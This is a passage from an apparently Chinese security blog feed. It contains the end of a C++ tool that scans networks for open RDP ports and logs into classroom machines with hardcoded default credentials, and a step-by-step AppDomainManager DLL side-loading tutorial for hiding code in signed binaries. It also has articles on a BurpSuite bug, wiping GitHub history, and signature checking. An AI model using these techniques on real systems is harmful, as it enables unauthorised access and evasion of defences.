class="hljs-string">&quot;TERMSRV/&quot;</span> + ip;<br>    credential.TargetName = (LPSTR)ip.<span class="hljs-built_in">c_str</span>();<br>    credential.UserName = (LPSTR)username.<span class="hljs-built_in">c_str</span>();<br><br>    <span class="hljs-comment">//按API文档所述，密码必须使用UTF-16编码，所以这里用wstring</span><br>    credential.CredentialBlob = (LPBYTE)password.<span class="hljs-built_in">c_str</span>();<br>    credential.CredentialBlobSize = password.<span class="hljs-built_in">size</span>() * <span class="hljs-number">2</span>;<br>    credential.Persist = CRED_PERSIST_SESSION;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">CredWriteA</span>(&amp;credential, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    hConsole = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);<br>    <span class="hljs-built_in">SetConsoleTitleA</span>(<span class="hljs-string">&quot;fuck h3class&quot;</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&gt;&quot;</span>);<br>        string input;<br>        <span class="hljs-built_in">getline</span>(cin, input);<br><br>        vector&lt;string&gt; cmd = <span class="hljs-built_in">StringTokenizer</span>(input);<br>        <span class="hljs-keyword">if</span> (cmd.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>)<span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">if</span> (cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;quit&quot;</span> || cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;q&quot;</span>) &#123;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;scan&quot;</span> || cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;s&quot;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (cmd.<span class="hljs-built_in">size</span>() &lt; <span class="hljs-number">2</span> || cmd.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">3</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入不合法\nscan指令用法：scan CIDR地址 [线程数]&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-type">uint32_t</span> number_of_threads = <span class="hljs-number">260</span>;<br>            <span class="hljs-keyword">if</span> (cmd.<span class="hljs-built_in">size</span>() == <span class="hljs-number">3</span>) &#123;<br>                number_of_threads = <span class="hljs-built_in">stoi</span>(cmd[<span class="hljs-number">2</span>]);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (number_of_threads &gt; <span class="hljs-number">1000</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入不合法\n线程数过大&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (!CIDRParser.<span class="hljs-built_in">SetCIDR</span>(cmd[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入不合法\n请输入正确的CIDR地址&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;开始扫描地址 %s 线程数 %d\n&quot;</span>, cmd[<span class="hljs-number">1</span>].<span class="hljs-built_in">c_str</span>(), number_of_threads);<br><br>            <span class="hljs-built_in">SetConsoleTextAttribute</span>(hConsole, <span class="hljs-number">2</span>);<br><br>            std::vector&lt;std::thread&gt; threads;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; number_of_threads; ++i) &#123;<br>                threads.<span class="hljs-built_in">emplace_back</span>(Scanner);<br>            &#125;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; t : threads) &#123;<br>                t.<span class="hljs-built_in">join</span>();<br>            &#125;<br><br>            <span class="hljs-built_in">SetConsoleTextAttribute</span>(hConsole, <span class="hljs-number">7</span>);<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n扫描完成&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;check&quot;</span> || cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;c&quot;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (cmd.<span class="hljs-built_in">size</span>() != <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入不合法\ncheck指令用法：check IP地址&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>        <br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsPortOpen</span>(cmd[<span class="hljs-number">1</span>].<span class="hljs-built_in">c_str</span>(), <span class="hljs-number">3389</span>)) &#123;<br>                <span class="hljs-built_in">CONSOLE_COLOR_GREEN</span>(<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;开启\n&quot;</span>));<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">CONSOLE_COLOR_RED</span>(<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;关闭\n&quot;</span>));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;hack&quot;</span> || cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;h&quot;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (cmd.<span class="hljs-built_in">size</span>() != <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入不合法\nhack指令用法：hack IP地址&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CreateRDPCredA</span>(cmd[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;h3class&quot;</span>, <span class="hljs-string">L&quot;h3class&quot;</span>)) &#123;<br>                <span class="hljs-built_in">CONSOLE_COLOR_RED</span>(<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无法创建凭据，请手动登录\n&quot;</span>));<br>            &#125;<br><br>            string tmp = <span class="hljs-string">&quot;start /b mstsc /v:&quot;</span> + cmd[<span class="hljs-number">1</span>];<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, tmp.<span class="hljs-built_in">c_str</span>());<br>            <span class="hljs-built_in">system</span>(tmp.<span class="hljs-built_in">c_str</span>());<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未知指令&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="提醒"><a href="#提醒" class="headerlink" title="提醒"></a>提醒</h1><p>远程桌面登录时对方会锁屏。和朋友玩玩就行了，千万不要破坏课堂秩序！</p>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>安全工具</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BurpSuite访问带下划线域名时出现SSL错误</title>
    <link href="/articles/burp_ssl_bug/"/>
    <url>/articles/burp_ssl_bug/</url>
    
    <content type="html"><![CDATA[<h1 id="下划线引发的ssl错误"><a href="#下划线引发的ssl错误" class="headerlink" title="下划线引发的ssl错误"></a>下划线引发的ssl错误</h1><p>最近在用burpsuite做测试的过程中，出现了<code>ERR_SSL_PROTOCOL_ERROR</code>错误</p><p>证书和代理设置的都没问题</p><p><img src="/articles/burp_ssl_bug/1.png"></p><p>经过测试发现，域名中包含下划线时就会出现这种问题</p><p><img src="/articles/burp_ssl_bug/2.png"></p><p>上网查阅资料可知，域名中包含下划线是不符合标准的，burp官方也表态不会进行修复</p><p><a href="https://forum.portswigger.net/thread/domain-with-underscore-gives-error-4093632e">https://forum.portswigger.net/thread/domain-with-underscore-gives-error-4093632e</a></p><p><img src="/articles/burp_ssl_bug/3.png"></p><p>不过有意思的是，就算不符合标准，带下划线的dns记录也能正常创建，而且很多网站域名都带下划线</p><p><img src="/articles/burp_ssl_bug/5.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">host=&quot;_&quot; &amp;&amp; port=&quot;443&quot;<br></code></pre></td></tr></table></figure><p><img src="/articles/burp_ssl_bug/6.png"></p><p><strong>利用burpsuite的这个问题，我们就可以通过<code>域名加下划线 + 强制https</code>来禁止burpsuite访问网站（学到一个奇技淫巧，笑</strong></p><p><img src="/articles/burp_ssl_bug/7.png"></p><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>经过测试，国产的<a href="https://yaklang.io/">yakit</a>就没有这个问题</p><p><img src="/articles/burp_ssl_bug/4.png"></p><p>所以解决方法就是：<del>放弃burpsuite</del>，使用<a href="https://yaklang.io/">yakit</a>（笑</p>]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>安全工具</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【小技巧】github删库小技巧</title>
    <link href="/articles/github_run_away/"/>
    <url>/articles/github_run_away/</url>
    
    <content type="html"><![CDATA[<h1 id="删除Commit记录"><a href="#删除Commit记录" class="headerlink" title="删除Commit记录"></a>删除Commit记录</h1><p>创建个临时目录，进入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir tmp&amp;cd tmp<br></code></pre></td></tr></table></figure><p>git初始化，创建个占位空文件，添加commit</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">git init<br>copy nul placeholder<br>git add -A<br>git commit -m &quot;First commit&quot;<br></code></pre></td></tr></table></figure><p>强制推送到远程分支</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git push -u 远程仓库地址 HEAD:远程分支 --force<br></code></pre></td></tr></table></figure><p>当然，以上操作在删除commit记录的同时会删除所有文件</p><p>如果不想删除文件，可以先将仓库clone下来，删除.git隐藏文件夹再初始化、添加commit、推送</p><p>注意：由于git的缓存机制，删除的commit记录在一段时间内仍能访问（unreachable commits）</p><h1 id="删除Actions和Deployments"><a href="#删除Actions和Deployments" class="headerlink" title="删除Actions和Deployments"></a>删除Actions和Deployments</h1><p>网站上没有批量删除的功能，这里写个脚本调用API实现批量删除</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>token = <span class="hljs-string">&#x27;此处填写token&#x27;</span><br>repo = <span class="hljs-string">&#x27;此处填写仓库&#x27;</span><br><br>headers =&#123;<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;application/vnd.github+json&#x27;</span>,<br>    <span class="hljs-string">&#x27;Authorization&#x27;</span>:<span class="hljs-string">f&quot;Bearer <span class="hljs-subst">&#123;token&#125;</span>&quot;</span>,<br>    <span class="hljs-string">&#x27;X-GitHub-Api-Version&#x27;</span>:<span class="hljs-string">&#x27;2022-11-28&#x27;</span><br>&#125;<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;开始删除Actions&#x27;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    response = requests.get(<span class="hljs-string">f&quot;https://api.github.com/repos/<span class="hljs-subst">&#123;repo&#125;</span>/actions/runs?per_page=100&quot;</span>)<br>    response.raise_for_status()<br>    response = response.json()<br>    <span class="hljs-keyword">if</span>(response[<span class="hljs-string">&#x27;total_count&#x27;</span>] == <span class="hljs-number">0</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;删除完成&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> action <span class="hljs-keyword">in</span> response[<span class="hljs-string">&#x27;workflow_runs&#x27;</span>]:<br>        response = requests.delete(<span class="hljs-string">f&quot;https://api.github.com/repos/<span class="hljs-subst">&#123;repo&#125;</span>/actions/runs/<span class="hljs-subst">&#123;action[<span class="hljs-string">&#x27;id&#x27;</span>]&#125;</span>&quot;</span>, headers = headers)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;删除 <span class="hljs-subst">&#123;action[<span class="hljs-string">&#x27;run_number&#x27;</span>]&#125;</span>&#x27;</span>, end=<span class="hljs-string">&quot; &quot;</span>)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">204</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;成功&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;失败（<span class="hljs-subst">&#123;response.status_code&#125;</span>）&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;开始删除Deployments&#x27;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    response = requests.get(<span class="hljs-string">f&quot;https://api.github.com/repos/<span class="hljs-subst">&#123;repo&#125;</span>/deployments?per_page=100&quot;</span>)<br>    response.raise_for_status()<br>    response = response.json()<br>    <span class="hljs-keyword">for</span> deployment <span class="hljs-keyword">in</span> response:<br>        response = requests.delete(<span class="hljs-string">f&quot;https://api.github.com/repos/<span class="hljs-subst">&#123;repo&#125;</span>/deployments/<span class="hljs-subst">&#123;deployment[<span class="hljs-string">&#x27;id&#x27;</span>]&#125;</span>&quot;</span>, headers = headers)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;删除 <span class="hljs-subst">&#123;deployment[<span class="hljs-string">&#x27;id&#x27;</span>]&#125;</span>&#x27;</span>, end=<span class="hljs-string">&quot; &quot;</span>)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">204</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;成功&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;失败（<span class="hljs-subst">&#123;response.status_code&#125;</span>）&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;删除完成&#x27;</span>)<br>    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
      <tag>Github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AppDomainManager劫持实现dll侧加载（白加黑）</title>
    <link href="/articles/appDomainManager_exploit/"/>
    <url>/articles/appDomainManager_exploit/</url>
    
    <content type="html"><![CDATA[<p>参考文章 <a href="https://mp.weixin.qq.com/s/dHZdal6A-SX2vMWZNu6sQQ">https://mp.weixin.qq.com/s/dHZdal6A-SX2vMWZNu6sQQ</a></p><p>注意：因为恶意dll劫持后没有完成AppDomainManager原始的功能，所以白文件在运行后会崩溃，在事件日志中也会记录</p><p><img src="/articles/appDomainManager_exploit/4.png"></p><h1 id="AppDomainManager劫持"><a href="#AppDomainManager劫持" class="headerlink" title="AppDomainManager劫持"></a>AppDomainManager劫持</h1><p>首先，编写一个恶意的cs代码（evil.cs）</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.EnterpriseServices;<br><span class="hljs-keyword">using</span> System.Runtime.InteropServices;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">EvilAppDomainManager</span>:<span class="hljs-title">AppDomainManager</span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">InitializeNewDomain</span>(<span class="hljs-params">AppDomainSetup appDomainInfo</span>)</span>&#123;<br>        System.Windows.Forms.MessageBox.Show(<span class="hljs-string">&quot;恶意代码执行&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>csc编译出evil.dll</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:evil.dll evil.cs<br></code></pre></td></tr></table></figure><p>这里拿<code>XtuService.exe</code>作为白文件测试。拥有英特尔和WHQL的双签名，非常的白（赞赏）</p><p><img src="/articles/appDomainManager_exploit/2.png"></p><h2 id="第一种加载方法（配置文件）"><a href="#第一种加载方法（配置文件）" class="headerlink" title="第一种加载方法（配置文件）"></a>第一种加载方法（配置文件）</h2><p>在<code>XtuService.exe</code>同目录下创建<code>XtuService.exe.config</code>，内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">runtime</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">appDomainManagerAssembly</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;evil&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">appDomainManagerType</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;EvilAppDomainManager&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">runtime</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><p>此时运行<code>XtuService.exe</code>，恶意dll成功侧加载</p><p><img src="/articles/appDomainManager_exploit/1.png"></p><h2 id="第二种加载方法（环境变量）"><a href="#第二种加载方法（环境变量）" class="headerlink" title="第二种加载方法（环境变量）"></a>第二种加载方法（环境变量）</h2><p>使用环境变量无需创建配置文件，减小了检测面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">set APPDOMAIN_MANAGER_ASM=evil<br>set APPDOMAIN_MANAGER_TYPE=EvilAppDomainManager<br></code></pre></td></tr></table></figure><p>设置好环境变量，运行<code>XtuService.exe</code>，恶意dll成功侧加载</p><p><img src="/articles/appDomainManager_exploit/3.png"></p><h1 id="全局劫持"><a href="#全局劫持" class="headerlink" title="全局劫持"></a>全局劫持</h1><p><strong>白文件运行后会崩溃，非常不建议这样做</strong></p><h2 id="全局配置文件"><a href="#全局配置文件" class="headerlink" title="全局配置文件"></a>全局配置文件</h2><p>修改<code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config</code>的全局配置文件，并写入上述配置，可以劫持整个机器上的所有.NET程序</p><h2 id="全局环境变量"><a href="#全局环境变量" class="headerlink" title="全局环境变量"></a>全局环境变量</h2><p>创建全局的环境变量，同样可以劫持全部.NET程序</p><p><img src="/articles/appDomainManager_exploit/5.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【编程】使用wintrust API获取程序签名信息 &amp;&amp; 检查签名是否有效</title>
    <link href="/articles/wintrust_example/"/>
    <url>/articles/wintrust_example/</url>
    
    <content type="html"><![CDATA[<p>在编写安全工具的过程中，有时要验证程序的数字签名，微软提供了一套API可供调用<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/wintrust/">wintrust.h标头</a></p><h1 id="WinVerifyTrust"><a href="#WinVerifyTrust" class="headerlink" title="WinVerifyTrust"></a>WinVerifyTrust</h1><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/wintrust/nf-wintrust-winverifytrust">https://learn.microsoft.com/zh-cn/windows/win32/api/wintrust/nf-wintrust-winverifytrust</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">LONG <span class="hljs-title">WinVerifyTrust</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] GUID   *pgActionID,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] LPVOID pWVTData</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><code>hwnd</code>：调用方窗口的句柄，一般为<code>NULL</code></p><p><code>pgActionID</code>：指向GUID结构的指针，该结构指定信任提供程序。验证程序数字签名则传入<code>WINTRUST_ACTION_GENERIC_VERIFY_V2</code></p><p><code>pWVTData</code>：指向<code>WINTRUST_DATA</code>结构的指针，结构包括处理所需的信息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_WINTRUST_DATA</span> &#123;<br>  DWORD                               cbStruct;<br>  LPVOID                              pPolicyCallbackData;<br>  LPVOID                              pSIPClientData;<br>  DWORD                               dwUIChoice;<br>  DWORD                               fdwRevocationChecks;<br>  DWORD                               dwUnionChoice;<br>  <span class="hljs-keyword">union</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ...</span><br>    WINTRUST_FILE_INFO_                *pFile;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">WINTRUST_FILE_INFO_</span>         *pFile;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ...</span><br>    WINTRUST_CATALOG_INFO_             *pCatalog;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">WINTRUST_CATALOG_INFO_</span>      *pCatalog;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ...</span><br>    WINTRUST_BLOB_INFO_                *pBlob;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">WINTRUST_BLOB_INFO_</span>         *pBlob;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ...</span><br>    WINTRUST_SGNR_INFO_                *pSgnr;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">WINTRUST_SGNR_INFO_</span>         *pSgnr;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ...</span><br>    WINTRUST_CERT_INFO_                *pCert;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">WINTRUST_CERT_INFO_</span>         *pCert;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ...</span><br>    WINTRUST_DETACHED_SIG_INFO_        *pDetachedSig;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">WINTRUST_DETACHED_SIG_INFO_</span> *pDetachedSig;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  &#125;;<br>  DWORD                               dwStateAction;<br>  HANDLE                              hWVTStateData;<br>  WCHAR                               *pwszURLReference;<br>  DWORD                               dwProvFlags;<br>  DWORD                               dwUIContext;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">WINTRUST_SIGNATURE_SETTINGS_</span> *pSignatureSettings;<br>&#125; WINTRUST_DATA, *PWINTRUST_DATA;<br></code></pre></td></tr></table></figure><p><code>cbStruct</code>：结构大小，即<code>sizeof(WINTRUST_DATA)</code></p><p><code>dwUIChoice</code>：指定要使用的UI的类型，一般为<code>WTD_UI_NONE</code>(不显示UI)</p><p><code>fdwRevocationChecks</code>：证书吊销检查选项，可以是以下两个值</p><blockquote><p><code>WTD_REVOKE_NONE</code>：不检查证书是否被吊销，哪怕证书已经被吊销，也会将其视为有效，可以提高验证的速度（安全换效率）<br><code>WTD_REVOKE_WHOLECHAIN</code>：检查整个证书链中的所有证书是否被吊销，任何一个证书被吊销，则整个证书链失效（效率换安全）</p></blockquote><p><code>dwUnionChoice</code>：指定要使用的联合成员。验证文件则设置为<code>WTD_CHOICE_FILE</code></p><p><code>pFile</code>：指向<code>WINTRUST_FILE_INFO</code>结构的指针，包含要验证的文件信息</p><p><code>dwStateAction</code>：指定要执行的操作。如果不需要<code>hWVTStateData</code>成员则设置为<code>WTD_STATEACTION_IGNORE</code>，否则设置为<code>WTD_STATEACTION_VERIFY</code>（<code>hWVTStateData</code>成员在下文用于获取签名者姓名，所以我这里设置为<code>WTD_STATEACTION_VERIFY</code>）（如果设置为<code>WTD_STATEACTION_VERIFY</code>，则需要使用<code>WTD_STATEACTION_CLOSE</code>关闭句柄以免造成资源泄露）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">WINTRUST_FILE_INFO_</span> &#123;<br>  DWORD   cbStruct;<br>  LPCWSTR pcwszFilePath;<br>  HANDLE  hFile;<br>  GUID    *pgKnownSubject;<br>&#125; WINTRUST_FILE_INFO, *PWINTRUST_FILE_INFO;<br></code></pre></td></tr></table></figure><p><code>cbStruct</code>：结构大小，即<code>sizeof(WINTRUST_FILE_INFO)</code></p><p><code>pcwszFilePath</code>：要验证文件的完整路径</p><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>以下给出几个常用返回值，完整返回值列表可从 <a href="https://learn.microsoft.com/zh-cn/windows/win32/seccrypto/certificate-and-trust-return-values">https://learn.microsoft.com/zh-cn/windows/win32/seccrypto/certificate-and-trust-return-values</a> 